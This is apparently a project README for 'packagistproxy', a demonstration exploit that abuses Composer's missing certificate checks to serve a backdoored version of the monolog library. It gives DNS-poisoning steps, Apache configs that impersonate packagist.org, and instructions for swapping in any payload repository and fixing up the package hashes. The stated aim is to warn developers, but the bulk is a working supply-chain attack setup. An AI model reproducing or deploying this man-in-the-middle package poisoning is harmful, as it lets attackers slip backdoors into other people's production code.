# packagistproxy
Backdoor projects that use composer (exploit https://github.com/composer/composer/issues/1074)

This exploits composer's lack of certificate checking to drop a backdoored verson of an included library into a projects codebase.

This is for demonstration only, etc, etc. Hopefully this will show people why they shouldn't automatically run composer when deploying code into production until composer fixes their certificate checking.

# Setup

To exploit this issue, you have to get in the middle of a user's connection to packagist.org. For demo's, it's easiest to set a victim's dns to point to the attacker, but there are obviously plenty of other ways to get in the middle of a connection.

Once we're a MITM, we override a packagist's package definition with our own. It looks like composer uses that last defined definition for a package, so adding a extra provider at the end of packages.json seems to work well for now.

In this demo, the provider (re-)defines monolog/monolog. Not to pick on them as a project, but's it a popular one and in use by MediaWiki. The new definition points to my own version of monolog (https://github.com/Stype/monolog) for all versions of monolog currently defined (up to 1.15.0).

If you want to change the payload (you probably do), update monolog.json to point to the repository and commit of your choice. Then run

```
sha256sum monlog.json
```

to get the sha256 hash of that file. You'll need to update the hash in p-attack.json. The proxy.php script will automatically calculate the sha256 of p-attack.json when inserting the definition into package.json.

# Poisen DNS

For testing, on the victim I set a local hosts directive to point to my webserver (192.168.1.143).

/etc/hosts:
```
192.168.1.143	packagist.org
```


On my webserver, I have apache running with both http and https sites defined. Composer randomly uses both http and https, so the server needs to respond to both.

ssl.conf:
```
<VirtualHost 192.168.1.143:443>
  ServerName packagist.org
  DocumentRoot /srv/www/htdocs/packagistproxy

  ErrorLog /var/log/apache2/ssl-error.log
  TransferLog /var/log/apache2/ssl-access.log
  SSLEngine on
  SSLCertificateFile /etc/apache2/ssl.crt/server.crt
  SSLCertificateKeyFile /etc/apache2/ssl.key/server.key

  RewriteEngine on
  RewriteRule ^(.*)$ /proxy.php?url=$1
</VirtualHost>
```

and vhosts.conf:
```
<VirtualHost 192.168.1.143:80>
  ServerName packagist.org
  DocumentRoot /srv/www/htdocs/packagistproxy
  RewriteEngine on
  RewriteRule ^(.*)$ /proxy.php?url=$1
</VirtualHost>
```




